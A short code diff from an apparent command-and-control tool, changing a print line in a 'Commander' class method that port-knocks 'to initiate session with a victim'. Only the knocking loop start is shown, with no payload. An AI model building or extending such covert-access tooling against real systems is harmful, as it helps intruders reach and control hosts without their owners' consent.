@@ -31,7 +31,7 @@ class Commander:
 
     def port_knock(self):
         """Perform port knocking to initiate session with a victim."""
-        print("[*] Sending port knock sequence to victim...")
+        print(f"[*] Sending port knock sequence to victim {VICTIM_IP}")
         for port in KNOCK_SEQUENCE:
             try:
                 # Use a normal TCP SYN attempt for knocking
